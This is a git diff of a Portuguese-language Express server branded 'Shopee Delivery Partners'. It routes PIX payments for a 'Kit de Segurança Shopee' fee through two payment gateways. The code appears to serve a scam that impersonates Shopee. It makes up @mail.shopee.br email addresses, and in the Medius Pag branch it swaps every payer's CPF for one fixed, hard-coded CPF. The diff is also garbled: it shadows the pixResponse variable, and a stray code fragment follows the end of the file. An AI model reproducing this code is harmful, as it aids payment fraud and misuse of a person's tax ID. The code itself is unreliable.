@@ -213,18 +213,13 @@ app.post('/api/payments/create-pix', (req, res) => {
   res.json(pixResponse);
 });
 
-// Pagnet API Integration para produção
+// Sistema duplo de gateways PIX (Pagnet + Medius Pag) para produção
 app.post('/api/proxy/for4payments/pix', async (req, res) => {
   try {
-    // Verificar se as variáveis de ambiente estão configuradas
-    if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
-      console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
-      return res.status(500).json({
-        error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet no Heroku.',
-      });
-    }
+    // Verificar qual gateway usar baseado na variável de ambiente
+    const gatewayChoice = process.env.GATEWAY_CHOICE || 'PAGNET';
     
-    console.log('Iniciando transação Pagnet no Heroku...');
+    console.log(`[GATEWAY PROD] Usando gateway: ${gatewayChoice}`);
     
     // Processar os dados recebidos
     const { name, cpf, email, phone, amount = 47.40, description = "Kit de Segurança Shopee" } = req.body;
@@ -237,87 +232,221 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
     
     console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
-    console.log('Enviando payload para Pagnet API...');
     
-    // Integração direta com Pagnet API
-    const baseUrl = 'https://api.pagnetbrasil.com/v1';
-    const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
-    const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
+    let pixResponse = null;
     
-    // Preparar dados da transação
-    const amountCents = Math.round(parseFloat(amount.toString()) * 100);
-    const customerCpf = cpf.replace(/[^0-9]/g, '');
-    const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
-    
-    const payload = {
-      amount: amountCents,
-      paymentMethod: 'pix',
-      pix: { expiresInDays: 3 },
-      items: [{
-        title: 'Kit de Segurança Shopee',
-        unitPrice: amountCents,
-        quantity: 1,
-        tangible: false
-      }],
-      customer: {
-        name: name,
-        email: userEmail,
-        document: { type: 'cpf', number: customerCpf },
-        phone: customerPhone
-      },
-      externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
-    };
-    
-    // Fazer requisição para Pagnet
-    const fetch = (await import('node-fetch')).default;
-    const response = await fetch(`${baseUrl}/transactions`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': authHeader,
-        'User-Agent': 'ShopeeDeliveryApp/1.0'
-      },
-      body: JSON.stringify(payload)
-    });
-    
-    console.log('Response status da Pagnet:', response.status);
-    
-    const responseData = await response.json();
-    console.log('Response data da Pagnet:', JSON.stringify(responseData, null, 2));
-    
-    if (!response.ok) {
-      console.error('Erro da Pagnet API:', response.status, responseData);
-      return res.status(500).json({
-        error: 'Erro ao processar pagamento. Tente novamente.',
-        details: responseData.message || 'Erro desconhecido'
+    if (gatewayChoice === 'MEDIUS_PAG') {
+      // USAR MEDIUS PAG
+      if (!process.env.MEDIUS_PAG_SECRET_KEY) {
+        console.error('ERRO: MEDIUS_PAG_SECRET_KEY não configurada no Heroku');
+        return res.status(500).json({
+          error: 'Gateway Medius Pag não configurado. Configure a chave secreta no Heroku.',
+        });
+      }
+      
+      console.log('Iniciando transação Medius Pag no Heroku...');
+      
+      // Integração direta com Medius Pag API
+      const mediusUrl = 'https://api.mediuspag.com/functions/v1';
+      const authString = `${process.env.MEDIUS_PAG_SECRET_KEY}:x`;
+      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
+      
+      // Forçar CPF correto conforme especificado
+      const forcedCpf = "06537080177";
+      console.log(`[MEDIUS PAG PROD] Forçando CPF: ${forcedCpf} (original: ${cpf.substring(0, 3)}***)`);
+      
+      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
+      
+      const payload = {
+        customer: {
+          name: name,
+          email: userEmail,
+          phone: (phone || '11999999999').replace(/[^0-9]/g, ''),
+          document: {
+            type: "CPF",
+            number: forcedCpf
+          }
+        },
+        paymentMethod: "PIX",
+        pix: {
+          expiresInDays: 3
+        },
+        items: [{
+          title: description || 'Taxa de adesão',
+          unitPrice: amountCents,
+          quantity: 1,
+          externalRef: `MP${Date.now()}${Math.floor(Math.random() * 10000)}`
+        }],
+        amount: amountCents
+      };
+      
+      console.log('Enviando payload para Medius Pag API:', JSON.stringify(payload, null, 2));
+      
+      const fetch = (await import('node-fetch')).default;
+      const response = await fetch(`${mediusUrl}/transactions`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': authHeader,
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
       });
+      
+      console.log('Response status da Medius Pag:', response.status);
+      
+      const responseData = await response.json();
+      console.log('Response data da Medius Pag:', JSON.stringify(responseData, null, 2));
+      
+      if (!response.ok) {
+        console.error('Erro da Medius Pag API:', response.status, responseData);
+        return res.status(500).json({
+          error: 'Erro ao processar pagamento via Medius Pag. Tente novamente.',
+          details: responseData.message || 'Erro desconhecido'
+        });
+      }
+      
+      // Extrair dados do PIX da resposta Medius Pag
+      const transactionId = responseData.id;
+      let pixCode = '';
+      
+      // Buscar PIX code na estrutura aninhada da Medius Pag
+      if (responseData.pix && typeof responseData.pix === 'object') {
+        pixCode = responseData.pix.qrcode || responseData.pix.pixCopyPaste || '';
+      }
+      
+      // Fallback para estrutura principal
+      if (!pixCode) {
+        pixCode = responseData.pixCopyPaste || responseData.pixCode || '';
+      }
+      
+      console.log('Transaction ID extraído (Medius):', transactionId);
+      console.log('PIX Code extraído (Medius):', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
+      
+      if (!pixCode) {
+        console.error('PIX code não encontrado na resposta da Medius Pag. Resposta completa:', responseData);
+        return res.status(500).json({ error: 'Erro ao gerar código PIX via Medius Pag' });
+      }
+      
+      // Gerar QR Code URL
+      const pixQrCode = responseData.pix?.pixQrCode || `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
+      
+      pixResponse = {
+        id: transactionId,
+        pixCode: pixCode,
+        pixQrCode: pixQrCode,
+        status: 'pending',
+        emailSent: false
+      };
+      
+      console.log('✅ Transação Medius Pag criada com sucesso:', transactionId);
+      
+    } else {
+      // USAR PAGNET (PADRÃO)
+      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
+        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
+        return res.status(500).json({
+          error: 'Gateway Pagnet não configurado. Configure as chaves de API Pagnet no Heroku.',
+        });
+      }
+      
+      console.log('Iniciando transação Pagnet no Heroku...');
+      
+      // Integração direta com Pagnet API
+      const baseUrl = 'https://api.pagnetbrasil.com/v1';
+      const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
+      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
+      
+      // Preparar dados da transação
+      const amountCents = Math.round(parseFloat(amount.toString()) * 100);
+      const customerCpf = cpf.replace(/[^0-9]/g, '');
+      const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
+      
+      const payload = {
+        amount: amountCents,
+        paymentMethod: 'pix',
+        pix: { expiresInDays: 3 },
+        items: [{
+          title: 'Kit de Segurança Shopee',
+          unitPrice: amountCents,
+          quantity: 1,
+          tangible: false
+        }],
+        customer: {
+          name: name,
+          email: userEmail,
+          document: { type: 'cpf', number: customerCpf },
+          phone: customerPhone
+        },
+        externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
+      };
+      
+      console.log('Enviando payload para Pagnet API...');
+      
+      // Fazer requisição para Pagnet
+      const fetch = (await import('node-fetch')).default;
+      const response = await fetch(`${baseUrl}/transactions`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': authHeader,
+          'User-Agent': 'ShopeeDeliveryApp/1.0'
+        },
+        body: JSON.stringify(payload)
+      });
+      
+      console.log('Response status da Pagnet:', response.status);
+      
+      const responseData = await response.json();
+      console.log('Response data da Pagnet:', JSON.stringify(responseData, null, 2));
+      
+      if (!response.ok) {
+        console.error('Erro da Pagnet API:', response.status, responseData);
+        return res.status(500).json({
+          error: 'Erro ao processar pagamento. Tente novamente.',
+          details: responseData.message || 'Erro desconhecido'
+        });
+      }
+      
+      // Extrair dados do PIX da resposta
+      const transactionId = responseData.id;
+      const pixCode = responseData.pix?.qrcode || '';
+      
+      console.log('Transaction ID extraído:', transactionId);
+      console.log('PIX Code extraído:', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
+      
+      if (!pixCode) {
+        console.error('PIX code não encontrado na resposta da Pagnet. Resposta completa:', responseData);
+        return res.status(500).json({ error: 'Erro ao gerar código PIX' });
+      }
+      
+      // Gerar QR Code URL
+      const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
+      
+      // Resposta compatível com o formato esperado pelo frontend
+      const pixResponse = {
+        id: transactionId,
+        pixCode: pixCode,
+        pixQrCode: pixQrCode,
+        status: 'pending',
+        emailSent: false
+      };
+      
+      console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
+      console.log('Enviando resposta para frontend:', JSON.stringify(pixResponse, null, 2));
+      
+      // Garantir que a resposta seja enviada corretamente
+      pixResponse = {
+        id: transactionId,
+        pixCode: pixCode,
+        pixQrCode: pixQrCode,
+        status: 'pending',
+        emailSent: false
+      };
+      
+      console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
     }
     
-    // Extrair dados do PIX da resposta
-    const transactionId = responseData.id;
-    const pixCode = responseData.pix?.qrcode || '';
-    
-    console.log('Transaction ID extraído:', transactionId);
-    console.log('PIX Code extraído:', pixCode ? 'ENCONTRADO' : 'NÃO ENCONTRADO');
-    
-    if (!pixCode) {
-      console.error('PIX code não encontrado na resposta da Pagnet. Resposta completa:', responseData);
-      return res.status(500).json({ error: 'Erro ao gerar código PIX' });
-    }
-    
-    // Gerar QR Code URL
-    const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
-    
-    // Resposta compatível com o formato esperado pelo frontend
-    const pixResponse = {
-      id: transactionId,
-      pixCode: pixCode,
-      pixQrCode: pixQrCode,
-      status: 'pending',
-      emailSent: false
-    };
-    
-    console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
     console.log('Enviando resposta para frontend:', JSON.stringify(pixResponse, null, 2));
     
     // Garantir que a resposta seja enviada corretamente
@@ -326,7 +455,7 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     res.status(200).json(pixResponse);
     
   } catch (error) {
-    console.error('Erro ao processar pagamento Pagnet:', error);
+    console.error(`Erro ao processar pagamento via ${process.env.GATEWAY_CHOICE || 'PAGNET'}:`, error);
     res.setHeader('Content-Type', 'application/json');
     res.status(500).json({
       error: 'Erro interno do servidor ao processar pagamento',
@@ -354,121 +483,19 @@ app.get('*', (req, res) => {
   const buildPath = path.join(__dirname, 'dist/public');
   const indexPath = path.join(buildPath, 'index.html');
   
-  // Verificar se o index.html existe
   if (fs.existsSync(indexPath)) {
-    // Ler o arquivo HTML e injetar script de scroll automático
-    fs.readFile(indexPath, 'utf8', (err, html) => {
-      if (err) {
-        res.sendFile(indexPath);
-        return;
-      }
-      
-      // Script para scroll automático em mudanças de rota
-      const scrollScript = `
-        <script>
-          // Scroll automático para o topo em mudanças de página
-          (function() {
-            let lastUrl = location.href;
-            new MutationObserver(() => {
-              const url = location.href;
-              if (url !== lastUrl) {
-                lastUrl = url;
-                window.scrollTo(0, 0);
-              }
-            }).observe(document, {subtree: true, childList: true});
-            
-            // Scroll inicial também
-            window.addEventListener('DOMContentLoaded', () => window.scrollTo(0, 0));
-            
-            // Fallback para mudanças de hash
-            window.addEventListener('hashchange', () => window.scrollTo(0, 0));
-          })();
-        </script>
-      `;
-      
-      // Injetar script antes do fechamento do body
-      const modifiedHtml = html.replace('</body>', scrollScript + '</body>');
-      res.type('html').send(modifiedHtml);
-    });
+    res.sendFile(indexPath);
   } else {
-    // Se não existe, mostrar página de erro simples
-    res.status(503).type('html').send(`
-    <!DOCTYPE html>
-    <html lang="pt-BR">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Shopee Delivery Partners - Erro</title>
-        <style>
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
-                margin: 0;
-                padding: 0;
-                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-            }
-            .container {
-                background: white;
-                padding: 3rem;
-                border-radius: 20px;
-                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
-                text-align: center;
-                max-width: 500px;
-                width: 90%;
-            }
-            h1 { color: #E83D22; }
-            .error { background: #ffe6e6; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>Shopee Delivery Partners</h1>
-            <p>Arquivos não encontrados</p>
-            <div class="error">
-                <strong>Status:</strong> Build não foi executado durante o deploy
-            </div>
-            <p>Entre em contato com o suporte técnico.</p>
-        </div>
-    </body>
-    </html>
-    `);
+    res.status(404).send('Página não encontrada');
   }
 });
 
-// Inicializar servidor de produção
-function initialize() {
-  console.log('🚀 Iniciando servidor Shopee Delivery Partners (Produção)...');
-  
-  const buildPath = path.join(__dirname, 'dist/public');
-  const indexPath = path.join(buildPath, 'index.html');
-  
-  if (fs.existsSync(indexPath)) {
-    console.log('✅ Arquivos estáticos encontrados em dist/public/');
-  } else {
-    console.log('⚠️  Arquivos estáticos não encontrados. Execute o build primeiro.');
-  }
-  
-  // Iniciar servidor
-  app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Servidor rodando na porta ${PORT}`);
-    console.log(`🌐 Ambiente: ${process.env.NODE_ENV || 'production'}`);
-    console.log(`📦 Servindo arquivos estáticos de: ${buildPath}`);
-  });
-}
-
-// Cleanup
-process.on('SIGTERM', () => {
-  console.log('Recebido SIGTERM, encerrando...');
-  process.exit(0);
+// Iniciar servidor
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Servidor Heroku rodando na porta ${PORT}`);
+  console.log(`Gateway escolhido: ${process.env.GATEWAY_CHOICE || 'PAGNET'}`);
 });
-
-process.on('SIGINT', () => {
-  console.log('Recebido SIGINT, encerrando...');
-  process.exit(0);
-});
-
-// Inicializar
-initialize();
+      const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
+      
+      // Preparar dados da transação
